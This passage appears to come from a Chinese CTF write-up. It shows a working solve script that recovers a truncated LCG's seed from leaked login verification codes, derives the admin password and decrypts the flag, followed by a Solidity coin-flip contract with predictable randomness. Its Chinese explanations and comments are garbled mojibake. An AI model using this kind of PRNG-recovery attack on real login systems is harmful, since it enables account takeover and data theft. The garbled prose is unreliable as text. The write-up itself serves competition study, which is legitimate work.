</span></span><span class=line><span class=cl>            <span class=n>num</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>randbytes</span><span class=p>(</span><span class=n>n</span> <span class=o>//</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>num</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=n>n</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span> <span class=o>|</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>isPrime</span><span class=p>(</span><span class=n>p</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>getrandbits</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>num</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>randbytes</span><span class=p>((</span><span class=n>n</span> <span class=o>+</span> <span class=mi>7</span><span class=p>)</span> <span class=o>//</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>num</span><span class=p>)</span> <span class=o>&amp;</span> <span class=p>((</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=n>n</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__repr__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s1>&#39;a = </span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>a</span><span class=si>}</span><span class=se>\n</span><span class=s1>b = </span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=si>}</span><span class=se>\n</span><span class=s1>p = </span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>å¾ˆæ˜¾ç„¶å¯ä»¥çŸ¥é“ï¼Œæ‰€æœ‰æ–¹æ³•å‡ ä¹éƒ½æ˜¯å›´ç»•ç€ <code>randbytes</code> å®ç°çš„ï¼Œè€Œ <code>randbytes</code> ä¸­æ¯ä¸ªå­—èŠ‚çš„ç”Ÿæˆå®é™…ä¸Šæ˜¯ä¸€ä¸ªè¿™æ ·çš„é€’æ¨å…³ç³»ï¼š
$$Y_{n+1} = [(aX_n + b) \mod p] \mod 256$$
å…¶ä¸­ $Y_{n+1}$ æ˜¯ <code>randbytes</code> çš„è¾“å‡ºï¼Œ$X_n$ æ˜¯PRNGå†…éƒ¨çŠ¶æ€ï¼Œå¾ˆæ˜æ˜¾ï¼Œè¿™æ˜¯Truncated LCG (æˆªæ–­çº¿æ€§åŒä½™ç”Ÿæˆå™¨)ï¼Œæ ¹æ®åŒä½™æ€§è´¨å®é™…ä¸Šæœ‰ï¼š$$X_n = Y_n + 256k_n$$
æ‰€ä»¥ä¸Šè¿°é€’æ¨å¼å®é™…ä¸Šç­‰ä»·äºï¼š$$Y_{n+1} + 256k_{n+1} \equiv a(Y_n + 256k_n) + b \pmod{p}$$
å› ä¸º $a, b$ éƒ½ä¼šç»™å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœå¯ä»¥æ”¶é›†åˆ°è¶³å¤Ÿå¤šçš„æ ·æœ¬ $Y_n$ åº”è¯¥æœ‰å¯èƒ½é€šè¿‡æ„é€ æ ¼ (Lattice) æˆ–è€…é€šè¿‡ä¸€ç§ç±»ä¼¼æ±‚å°æ ¹çš„æ–¹å¼æ¢å¤å‡ºæ‰€æœ‰ $X_n = Y_n + 256k_n$ã€‚</p><p>è§‚å¯Ÿä»£ç å¯ä»¥çœ‹åˆ°ï¼Œæ¯æ¬¡ç™»å½•çš„æ—¶å€™ç³»ç»Ÿéƒ½ä¼šè°ƒç”¨ <code>prng.randbytes(4)</code> ç”Ÿæˆå››ä¸ªéšæœºå­—èŠ‚ã€‚å¦‚æœæˆ‘ä»¬è¿ç»­ç™»å½• $n$ æ¬¡çš„è¯å°±å¯ä»¥è·å¾— $4n$ ä¸ª prng çš„æˆªæ–­è¾“å‡ºã€‚</p><p>ä»è€Œå°è¯•ä½¿ç”¨ CVPï¼ˆæœ€è¿‘å‘é‡é—®é¢˜ï¼‰ç›¸å…³çš„æ ¼æ”»å‡»è§£æ–¹ç¨‹ç»„ï¼š</p><p>$$ Y_{n+1} + 256k_{n+1} \equiv a(Y_n + 256k_n) + b \pmod{p} $$</p><p>å¾—åˆ° $k_n$ï¼Œä»è€Œæ¢å¤å‡º seedï¼Œè¿™æ ·å°±å¯ä»¥æ¢å¤å‡º admin çš„å¯†ç äº†ã€‚ä¸æ­¤åŒæ—¶ï¼Œå› ä¸ºæˆ‘ä»¬æ¢å¤äº† prngï¼Œæ‰€ä»¥åŠ å¯† flag ç”¨çš„ key å’Œ iv ä¹Ÿå°±æåˆ°äº†ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>string</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sage.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>cuso</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>main</span> <span class=kn>import</span> <span class=n>PRNG</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;pwn-fc3efcd9ef.challenge.xctf.org.cn&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># menu = &#34;&#34;&#34;Flag Management System</span>
</span></span><span class=line><span class=cl><span class=c1># [L]ogin</span>
</span></span><span class=line><span class=cl><span class=c1># [G]et Public Key</span>
</span></span><span class=line><span class=cl><span class=c1># [R]ead Flag</span>
</span></span><span class=line><span class=cl><span class=c1># [E]xit&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># è·å¾—å…¬é’¥</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;G&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;=&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;=&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;=&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getVerify</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;code:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Y</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;L&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>verify</span> <span class=o>=</span> <span class=n>getVerify</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>Y</span> <span class=o>+=</span> <span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>verify</span><span class=p>[</span><span class=n>i</span><span class=p>:</span> <span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>2</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Username:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;114514&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Password:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;1919810&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;code:&#39;</span><span class=p>,</span> <span class=n>verify</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>k</span> <span class=o>=</span> <span class=p>[</span><span class=n>var</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;k</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>Y</span><span class=p>))]</span>
</span></span><span class=line><span class=cl><span class=n>roots</span> <span class=o>=</span> <span class=n>cuso</span><span class=o>.</span><span class=n>find_small_roots</span><span class=p>(</span><span class=n>relations</span><span class=o>=</span><span class=p>[</span><span class=n>a</span> <span class=o>*</span> <span class=p>(</span><span class=n>Y</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=mi>256</span> <span class=o>*</span> <span class=n>k</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>+</span> <span class=n>b</span> <span class=o>-</span> <span class=p>(</span><span class=n>Y</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>256</span> <span class=o>*</span> <span class=n>k</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>])</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>Y</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)],</span> 
</span></span><span class=line><span class=cl>                              <span class=n>bounds</span><span class=o>=</span><span class=p>{</span><span class=n>k</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=o>**</span><span class=mi>120</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>Y</span><span class=p>))},</span> 
</span></span><span class=line><span class=cl>                              <span class=n>modulus</span><span class=o>=</span><span class=p>[</span><span class=n>p</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>Y</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>x0</span> <span class=o>=</span> <span class=n>Y</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=mi>256</span> <span class=o>*</span> <span class=n>roots</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=n>k</span><span class=p>[</span><span class=mi>0</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>33</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>x0</span> <span class=o>=</span> <span class=p>(</span><span class=n>x0</span> <span class=o>-</span> <span class=n>b</span><span class=p>)</span> <span class=o>*</span> <span class=nb>pow</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>p</span><span class=p>)</span> <span class=o>%</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prng</span> <span class=o>=</span> <span class=n>PRNG</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>p</span><span class=p>,</span> <span class=n>x0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>prng</span><span class=o>.</span><span class=n>choices</span><span class=p>(</span><span class=n>ascii_letters</span> <span class=o>+</span> <span class=n>digits</span><span class=p>,</span> <span class=mi>32</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Recovered password: </span><span class=si>{</span><span class=n>password</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;L&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>verify</span> <span class=o>=</span> <span class=n>getVerify</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ç™»å½•</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Username:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;admin&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Password:&#39;</span><span class=p>,</span> <span class=n>password</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;code:&#39;</span><span class=p>,</span> <span class=n>verify</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;admin&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># åˆ¤æ–­ç§å­æ˜¯å¦è¢«æ­£ç¡®æ¢å¤</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>prng</span><span class=o>.</span><span class=n>randbytes</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span> <span class=o>==</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>Y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prng</span><span class=o>.</span><span class=n>randbytes</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;R&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>prng</span><span class=o>.</span><span class=n>randbytes</span><span class=p>(</span><span class=mi>16</span><span class=p>),</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>prng</span><span class=o>.</span><span class=n>randbytes</span><span class=p>(</span><span class=mi>16</span><span class=p>))</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>())))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=blockchain>blockchain</h2><p>åˆçº¦</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Solidity data-lang=Solidity><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>4</span><span class=p>.</span><span class=mi>25</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>CoinFlip</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>event</span> <span class=nc>ConsecutiveWins</span><span class=p>(</span><span class=kt>address</span><span class=p>,</span><span class=kt>uint256</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint256</span> <span class=k>public</span> <span class=n>consecutiveWins</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint256</span> <span class=k>private</span> <span class=n>consecutiveWinNumber</span><span class=o>=</span><span class=mi>10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>private</span> <span class=n>winer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint256</span> <span class=k>private</span> <span class=n>lastNance</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>string</span> <span class=k>private</span> <span class=n>key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>bool</span> <span class=k>private</span> <span class=n>isStart</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>(</span><span class=kt>string</span> <span class=k>memory</span> <span class=n>_key</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=nb>keccak256</span><span class=p>(</span><span class=n>_key</span><span class=p>)</span><span class=o>!=</span><span class=nb>keccak256</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>),</span><span class=s>&#34;please input key&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>consecutiveWins</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span><span class=o>=</span><span class=n>_key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>isStart</span><span class=o>=</span><span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=kd>modifier</span> <span class=nf>onlyEOA</span><span class=p>()</span>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=o>==</span><span class=nb>tx</span><span class=p>.</span><span class=nb>origin</span><span class=p>,</span><span class=s>&#34;only EOA&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>modifier</span> <span class=nf>verifyConsecutiveWins</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>isStart</span><span class=o>==</span><span class=kc>true</span><span class=p>,</span><span class=s>&#34;Game is not over&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>consecutiveWins</span><span class=o>==</span><span class=n>consecutiveWinNumber</span><span class=o>&amp;&amp;</span><span class=n>winer</span><span class=o>!=</span><span class=kt>address</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span><span class=s>&#34;no winner&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>flip</span><span class=p>(</span><span class=kt>bool</span> <span class=n>_guess</span><span class=p>)</span> <span class=k>public</span> <span class=n>onlyEOA</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>,</span><span class=kt>string</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>isStart</span><span class=o>==</span><span class=kc>false</span><span class=p>,</span><span class=s>&#34;Game over!!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=n>nonce</span><span class=o>=</span><span class=kt>uint256</span><span class=p>(</span><span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encode</span><span class=p>(</span><span class=nb>keccak256</span><span class=p>(</span><span class=n>lastNance</span><span class=p>),</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>,</span><span class=nb>blockhash</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>number</span> <span class=o>-</span> <span class=mi>1</span><span class=p>),</span><span class=nb>block</span><span class=p>.</span><span class=nb>difficulty</span><span class=p>,</span><span class=nb>keccak256</span><span class=p>(</span><span class=nb>tx</span><span class=p>.</span><span class=nb>origin</span><span class=p>),</span><span class=nb>keccak256</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>))));</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>lastNance</span> <span class=o>==</span> <span class=n>nonce</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nb>revert</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>lastNance</span> <span class=o>=</span> <span class=n>nonce</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=n>coinFlip</span> <span class=o>=</span> <span class=kt>uint256</span><span class=p>(</span><span class=kt>uint256</span><span class=p>(</span><span class=n>nonce</span><span class=p>)</span> <span class=o>%</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>bool</span> <span class=n>side</span> <span class=o>=</span> <span class=n>coinFlip</span> <span class=o>==</span> <span class=mi>1</span> <span class=o>?</span> <span class=kc>true</span> <span class=o>:</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>side</span> <span class=o>==</span> <span class=n>_guess</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>consecutiveWins</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>consecutiveWins</span><span class=o>==</span><span class=n>consecutiveWinNumber</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>winer</span><span class=o>=</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>emit</span> <span class=n>ConsecutiveWins</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span><span class=n>consecutiveWinNumber</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>isStart</span><span class=o>=</span><span class=kc>true</span><span class=p>;</span>
